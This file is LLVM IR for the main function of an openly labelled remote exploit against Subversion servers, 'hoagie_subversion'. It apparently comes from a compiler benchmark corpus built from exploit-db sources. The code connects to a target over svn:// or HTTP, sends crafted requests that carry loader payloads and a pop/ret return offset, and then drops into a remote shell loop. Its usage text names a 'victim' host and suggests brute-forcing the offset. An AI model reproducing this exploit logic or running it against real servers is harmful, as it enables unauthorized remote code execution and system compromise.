; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_4537.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_4537.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { %struct.TYPE_2__, i32, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.hostent = type { i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [82 x i8] c"hoagie_subversion - remote exploit against subversion servers\0Aby greuff@void.at\0A\0A\00", align 1
@.str.1 = private unnamed_addr constant [29 x i8] c"Usage: %s serverurl offset\0A\0A\00", align 1
@.str.2 = private unnamed_addr constant [100 x i8] c"Examples:\0A   %s svn://localhost/repository 0x41414141\0A   %s http://victim.com:6666/svn 0x40414336\0A\0A\00", align 1
@.str.3 = private unnamed_addr constant [138 x i8] c"The offset is an alphanumeric address (or UTF-8 to be\0Amore precise) of a pop instruction, followed by a ret.\0ABrute force when in doubt.\0A\0A\00", align 1
@.str.4 = private unnamed_addr constant [77 x i8] c"When exploiting against an svn://-url, you can supply a\0Abinary offset too.\0A\0A\00", align 1
@.str.5 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.6 = private unnamed_addr constant [17 x i8] c"URI parse error\0A\00", align 1
@.str.7 = private unnamed_addr constant [66 x i8] c"parse_uri result:\0AProtocol: %d\0AHost: %s\0APort: %d\0ARepository: %s\0A\0A\00", align 1
@.str.8 = private unnamed_addr constant [33 x i8] c"Using offset 0x%02x%02x%02x%02x\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.9 = private unnamed_addr constant [7 x i8] c"socket\00", align 1
@.str.10 = private unnamed_addr constant [14 x i8] c"gethostbyname\00", align 1
@.str.11 = private unnamed_addr constant [8 x i8] c"connect\00", align 1
@SVN = common dso_local global i32 0, align 4
@.str.12 = private unnamed_addr constant [17 x i8] c"Server said: %s\0A\00", align 1
@.str.13 = private unnamed_addr constant [31 x i8] c"( 2 ( edit-pipeline ) %d:%s ) \00", align 1
@.str.14 = private unnamed_addr constant [22 x i8] c"( ANONYMOUS ( 0: ) ) \00", align 1
@.str.15 = private unnamed_addr constant [37 x i8] c"( get-dated-rev ( %d:%s%c%c%c%c ) ) \00", align 1
@stage1loader = common dso_local global i8* null, align 8
@HTTP = common dso_local global i32 0, align 4
@xmlreqfmt = common dso_local global i8* null, align 8
@requestfmt = common dso_local global i8* null, align 8
@.str.16 = private unnamed_addr constant [12 x i8] c"Sending:\0A%s\00", align 1
@stage2loader = common dso_local global i8* null, align 8
@stage2loaderlen = common dso_local global i32 0, align 4
@.str.17 = private unnamed_addr constant [24 x i8] c"Entering shell loop...\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  %9 = alloca [1000 x i8], align 16
  %10 = alloca [1000 x i8], align 16
  %11 = alloca [1000 x i8], align 16
  %12 = alloca [1000 x i8], align 16
  %13 = alloca [1000 x i8], align 16
  %14 = alloca [1000 x i8], align 16
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i64, align 8
  %18 = alloca %struct.sockaddr_in, align 4
  %19 = alloca %struct.hostent*, align 8
  %20 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %21 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str, i64 0, i64 0))
  %22 = load i32, i32* %4, align 4
  %23 = icmp ne i32 %22, 3
  br i1 %23, label %24, label %39

24:                                               ; preds = %2
  %25 = load i8**, i8*** %5, align 8
  %26 = getelementptr inbounds i8*, i8** %25, i64 0
  %27 = load i8*, i8** %26, align 8
  %28 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.1, i64 0, i64 0), i8* %27)
  %29 = load i8**, i8*** %5, align 8
  %30 = getelementptr inbounds i8*, i8** %29, i64 0
  %31 = load i8*, i8** %30, align 8
  %32 = load i8**, i8*** %5, align 8
  %33 = getelementptr inbounds i8*, i8** %32, i64 0
  %34 = load i8*, i8** %33, align 8
  %35 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.2, i64 0, i64 0), i8* %31, i8* %34)
  %36 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([138 x i8], [138 x i8]* @.str.3, i64 0, i64 0))
  %37 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([77 x i8], [77 x i8]* @.str.4, i64 0, i64 0))
  %38 = call i32 @exit(i32 1) #3
  unreachable

39:                                               ; preds = %2
  %40 = getelementptr inbounds [1000 x i8], [1000 x i8]* %12, i64 0, i64 0
  %41 = load i8**, i8*** %5, align 8
  %42 = getelementptr inbounds i8*, i8** %41, i64 1
  %43 = load i8*, i8** %42, align 8
  %44 = call i32 (i8*, i32, i8*, ...) @snprintf(i8* %40, i32 1000, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i8* %43)
  %45 = load i8**, i8*** %5, align 8
  %46 = getelementptr inbounds i8*, i8** %45, i64 1
  %47 = load i8*, i8** %46, align 8
  %48 = getelementptr inbounds [1000 x i8], [1000 x i8]* %13, i64 0, i64 0
  %49 = getelementptr inbounds [1000 x i8], [1000 x i8]* %14, i64 0, i64 0
  %50 = call i64 @parse_uri(i8* %47, i32* %20, i8* %48, i32* %7, i8* %49)
  %51 = icmp slt i64 %50, 0
  br i1 %51, label %52, label %55

52:                                               ; preds = %39
  %53 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.6, i64 0, i64 0))
  %54 = call i32 @exit(i32 1) #3
  unreachable

55:                                               ; preds = %39
  %56 = load i32, i32* %20, align 4
  %57 = getelementptr inbounds [1000 x i8], [1000 x i8]* %13, i64 0, i64 0
  %58 = load i32, i32* %7, align 4
  %59 = getelementptr inbounds [1000 x i8], [1000 x i8]* %14, i64 0, i64 0
  %60 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([66 x i8], [66 x i8]* @.str.7, i64 0, i64 0), i32 %56, i8* %57, i32 %58, i8* %59)
  %61 = load i8**, i8*** %5, align 8
  %62 = getelementptr inbounds i8*, i8** %61, i64 2
  %63 = load i8*, i8** %62, align 8
  %64 = call i64 @strtoul(i8* %63, i32* null, i32 16)
  store i64 %64, i64* %17, align 8
  %65 = bitcast i64* %17 to i8*
  store i8* %65, i8** %16, align 8
  %66 = load i8*, i8** %16, align 8
  %67 = getelementptr inbounds i8, i8* %66, i64 3
  %68 = load i8, i8* %67, align 1
  %69 = sext i8 %68 to i32
  %70 = load i8*, i8** %16, align 8
  %71 = getelementptr inbounds i8, i8* %70, i64 2
  %72 = load i8, i8* %71, align 1
  %73 = sext i8 %72 to i32
  %74 = load i8*, i8** %16, align 8
  %75 = getelementptr inbounds i8, i8* %74, i64 1
  %76 = load i8, i8* %75, align 1
  %77 = sext i8 %76 to i32
  %78 = load i8*, i8** %16, align 8
  %79 = getelementptr inbounds i8, i8* %78, i64 0
  %80 = load i8, i8* %79, align 1
  %81 = sext i8 %80 to i32
  %82 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.8, i64 0, i64 0), i32 %69, i32 %73, i32 %77, i32 %81)
  %83 = load i32, i32* @AF_INET, align 4
  %84 = load i32, i32* @SOCK_STREAM, align 4
  %85 = call i32 @socket(i32 %83, i32 %84, i32 0)
  store i32 %85, i32* %6, align 4
  %86 = load i32, i32* %6, align 4
  %87 = icmp slt i32 %86, 0
  br i1 %87, label %88, label %90

88:                                               ; preds = %55
  %89 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.9, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %244

90:                                               ; preds = %55
  %91 = getelementptr inbounds [1000 x i8], [1000 x i8]* %13, i64 0, i64 0
  %92 = call %struct.hostent* @gethostbyname(i8* %91)
  store %struct.hostent* %92, %struct.hostent** %19, align 8
  %93 = load %struct.hostent*, %struct.hostent** %19, align 8
  %94 = icmp eq %struct.hostent* %93, null
  br i1 %94, label %95, label %97

95:                                               ; preds = %90
  %96 = call i32 @herror(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.10, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %244

97:                                               ; preds = %90
  %98 = load i32, i32* @AF_INET, align 4
  %99 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 2
  store i32 %98, i32* %99, align 4
  %100 = load i32, i32* %7, align 4
  %101 = call i32 @htons(i32 %100)
  %102 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i32 %101, i32* %102, align 4
  %103 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  %104 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %103, i32 0, i32 0
  %105 = load %struct.hostent*, %struct.hostent** %19, align 8
  %106 = getelementptr inbounds %struct.hostent, %struct.hostent* %105, i32 0, i32 0
  %107 = load i32, i32* %106, align 4
  %108 = call i32 @memcpy(i32* %104, i32 %107, i32 4)
  %109 = load i32, i32* %6, align 4
  %110 = bitcast %struct.sockaddr_in* %18 to %struct.sockaddr*
  %111 = call i64 @connect(i32 %109, %struct.sockaddr* %110, i32 12)
  %112 = icmp slt i64 %111, 0
  br i1 %112, label %113, label %115

113:                                              ; preds = %97
  %114 = call i32 @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.11, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %244

115:                                              ; preds = %97
  %116 = load i32, i32* %20, align 4
  %117 = load i32, i32* @SVN, align 4
  %118 = icmp eq i32 %116, %117
  br i1 %118, label %119, label %192

119:                                              ; preds = %115
  %120 = load i32, i32* %6, align 4
  %121 = getelementptr inbounds [1000 x i8], [1000 x i8]* %10, i64 0, i64 0
  %122 = call i64 @read(i32 %120, i8* %121, i32 1000)
  store i64 %122, i64* %8, align 8
  %123 = load i64, i64* %8, align 8
  %124 = getelementptr inbounds [1000 x i8], [1000 x i8]* %10, i64 0, i64 %123
  store i8 0, i8* %124, align 1
  %125 = getelementptr inbounds [1000 x i8], [1000 x i8]* %10, i64 0, i64 0
  %126 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.12, i64 0, i64 0), i8* %125)
  %127 = getelementptr inbounds [1000 x i8], [1000 x i8]* %9, i64 0, i64 0
  %128 = getelementptr inbounds [1000 x i8], [1000 x i8]* %12, i64 0, i64 0
  %129 = call i32 @strlen(i8* %128)
  %130 = getelementptr inbounds [1000 x i8], [1000 x i8]* %12, i64 0, i64 0
  %131 = call i32 (i8*, i32, i8*, ...) @snprintf(i8* %127, i32 1000, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.13, i64 0, i64 0), i32 %129, i8* %130)
  %132 = load i32, i32* %6, align 4
  %133 = getelementptr inbounds [1000 x i8], [1000 x i8]* %9, i64 0, i64 0
  %134 = getelementptr inbounds [1000 x i8], [1000 x i8]* %9, i64 0, i64 0
  %135 = call i32 @strlen(i8* %134)
  %136 = call i32 @write(i32 %132, i8* %133, i32 %135)
  %137 = load i32, i32* %6, align 4
  %138 = getelementptr inbounds [1000 x i8], [1000 x i8]* %10, i64 0, i64 0
  %139 = call i64 @read(i32 %137, i8* %138, i32 1000)
  store i64 %139, i64* %8, align 8
  %140 = load i64, i64* %8, align 8
  %141 = getelementptr inbounds [1000 x i8], [1000 x i8]* %10, i64 0, i64 %140
  store i8 0, i8* %141, align 1
  %142 = getelementptr inbounds [1000 x i8], [1000 x i8]* %10, i64 0, i64 0
  %143 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.12, i64 0, i64 0), i8* %142)
  %144 = getelementptr inbounds [1000 x i8], [1000 x i8]* %9, i64 0, i64 0
  %145 = call i32 @strcpy(i8* %144, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.14, i64 0, i64 0))
  %146 = load i32, i32* %6, align 4
  %147 = getelementptr inbounds [1000 x i8], [1000 x i8]* %9, i64 0, i64 0
  %148 = getelementptr inbounds [1000 x i8], [1000 x i8]* %9, i64 0, i64 0
  %149 = call i32 @strlen(i8* %148)
  %150 = call i32 @write(i32 %146, i8* %147, i32 %149)
  %151 = load i32, i32* %6, align 4
  %152 = getelementptr inbounds [1000 x i8], [1000 x i8]* %10, i64 0, i64 0
  %153 = call i64 @read(i32 %151, i8* %152, i32 1000)
  store i64 %153, i64* %8, align 8
  %154 = load i64, i64* %8, align 8
  %155 = getelementptr inbounds [1000 x i8], [1000 x i8]* %10, i64 0, i64 %154
  store i8 0, i8* %155, align 1
  %156 = getelementptr inbounds [1000 x i8], [1000 x i8]* %10, i64 0, i64 0
  %157 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.12, i64 0, i64 0), i8* %156)
  %158 = getelementptr inbounds [1000 x i8], [1000 x i8]* %9, i64 0, i64 0
  %159 = load i8*, i8** @stage1loader, align 8
  %160 = call i32 @strlen(i8* %159)
  %161 = add nsw i32 %160, 4
  %162 = load i8*, i8** @stage1loader, align 8
  %163 = load i8*, i8** %16, align 8
  %164 = getelementptr inbounds i8, i8* %163, i64 0
  %165 = load i8, i8* %164, align 1
  %166 = sext i8 %165 to i32
  %167 = load i8*, i8** %16, align 8
  %168 = getelementptr inbounds i8, i8* %167, i64 1
  %169 = load i8, i8* %168, align 1
  %170 = sext i8 %169 to i32
  %171 = load i8*, i8** %16, align 8
  %172 = getelementptr inbounds i8, i8* %171, i64 2
  %173 = load i8, i8* %172, align 1
  %174 = sext i8 %173 to i32
  %175 = load i8*, i8** %16, align 8
  %176 = getelementptr inbounds i8, i8* %175, i64 3
  %177 = load i8, i8* %176, align 1
  %178 = sext i8 %177 to i32
  %179 = call i32 (i8*, i32, i8*, ...) @snprintf(i8* %158, i32 1000, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.15, i64 0, i64 0), i32 %161, i8* %162, i32 %166, i32 %170, i32 %174, i32 %178)
  %180 = load i32, i32* %6, align 4
  %181 = getelementptr inbounds [1000 x i8], [1000 x i8]* %9, i64 0, i64 0
  %182 = getelementptr inbounds [1000 x i8], [1000 x i8]* %9, i64 0, i64 0
  %183 = call i32 @strlen(i8* %182)
  %184 = call i32 @write(i32 %180, i8* %181, i32 %183)
  %185 = load i32, i32* %6, align 4
  %186 = getelementptr inbounds [1000 x i8], [1000 x i8]* %10, i64 0, i64 0
  %187 = call i64 @read(i32 %185, i8* %186, i32 1000)
  store i64 %187, i64* %8, align 8
  %188 = load i64, i64* %8, align 8
  %189 = getelementptr inbounds [1000 x i8], [1000 x i8]* %10, i64 0, i64 %188
  store i8 0, i8* %189, align 1
  %190 = getelementptr inbounds [1000 x i8], [1000 x i8]* %10, i64 0, i64 0
  %191 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.12, i64 0, i64 0), i8* %190)
  br label %240

192:                                              ; preds = %115
  %193 = load i32, i32* %20, align 4
  %194 = load i32, i32* @HTTP, align 4
  %195 = icmp eq i32 %193, %194
  br i1 %195, label %196, label %239

196:                                              ; preds = %192
  %197 = getelementptr inbounds [1000 x i8], [1000 x i8]* %11, i64 0, i64 0
  %198 = load i8*, i8** @xmlreqfmt, align 8
  %199 = load i8*, i8** @stage1loader, align 8
  %200 = load i8*, i8** %16, align 8
  %201 = getelementptr inbounds i8, i8* %200, i64 0
  %202 = load i8, i8* %201, align 1
  %203 = sext i8 %202 to i32
  %204 = load i8*, i8** %16, align 8
  %205 = getelementptr inbounds i8, i8* %204, i64 1
  %206 = load i8, i8* %205, align 1
  %207 = sext i8 %206 to i32
  %208 = load i8*, i8** %16, align 8
  %209 = getelementptr inbounds i8, i8* %208, i64 2
  %210 = load i8, i8* %209, align 1
  %211 = sext i8 %210 to i32
  %212 = load i8*, i8** %16, align 8
  %213 = getelementptr inbounds i8, i8* %212, i64 3
  %214 = load i8, i8* %213, align 1
  %215 = sext i8 %214 to i32
  %216 = call i32 (i8*, i32, i8*, ...) @snprintf(i8* %197, i32 1000, i8* %198, i8* %199, i32 %203, i32 %207, i32 %211, i32 %215)
  %217 = getelementptr inbounds [1000 x i8], [1000 x i8]* %11, i64 0, i64 0
  %218 = call i32 @strlen(i8* %217)
  %219 = sext i32 %218 to i64
  store i64 %219, i64* %8, align 8
  %220 = getelementptr inbounds [1000 x i8], [1000 x i8]* %9, i64 0, i64 0
  %221 = load i8*, i8** @requestfmt, align 8
  %222 = getelementptr inbounds [1000 x i8], [1000 x i8]* %14, i64 0, i64 0
  %223 = getelementptr inbounds [1000 x i8], [1000 x i8]* %13, i64 0, i64 0
  %224 = load i64, i64* %8, align 8
  %225 = getelementptr inbounds [1000 x i8], [1000 x i8]* %11, i64 0, i64 0
  %226 = call i32 (i8*, i32, i8*, ...) @snprintf(i8* %220, i32 1000, i8* %221, i8* %222, i8* %223, i64 %224, i8* %225)
  %227 = getelementptr inbounds [1000 x i8], [1000 x i8]* %9, i64 0, i64 0
  %228 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.16, i64 0, i64 0), i8* %227)
  %229 = load i32, i32* %6, align 4
  %230 = getelementptr inbounds [1000 x i8], [1000 x i8]* %9, i64 0, i64 0
  %231 = getelementptr inbounds [1000 x i8], [1000 x i8]* %9, i64 0, i64 0
  %232 = call i32 @strlen(i8* %231)
  %233 = call i32 @write(i32 %229, i8* %230, i32 %232)
  %234 = call i32 @sleep(i32 1)
  %235 = load i32, i32* %6, align 4
  %236 = load i8*, i8** @stage2loader, align 8
  %237 = load i32, i32* @stage2loaderlen, align 4
  %238 = call i32 @write(i32 %235, i8* %236, i32 %237)
  br label %239

239:                                              ; preds = %196, %192
  br label %240

240:                                              ; preds = %239, %119
  %241 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.17, i64 0, i64 0))
  %242 = load i32, i32* %6, align 4
  %243 = call i32 @exec_sh(i32 %242)
  store i32 0, i32* %3, align 4
  br label %244

244:                                              ; preds = %240, %113, %95, %88
  %245 = load i32, i32* %3, align 4
  ret i32 %245
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @snprintf(i8*, i32, i8*, ...) #1

declare dso_local i64 @parse_uri(i8*, i32*, i8*, i32*, i8*) #1

declare dso_local i64 @strtoul(i8*, i32*, i32) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i32 @herror(i8*) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @memcpy(i32*, i32, i32) #1

declare dso_local i64 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i64 @read(i32, i8*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @strcpy(i8*, i8*) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @exec_sh(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
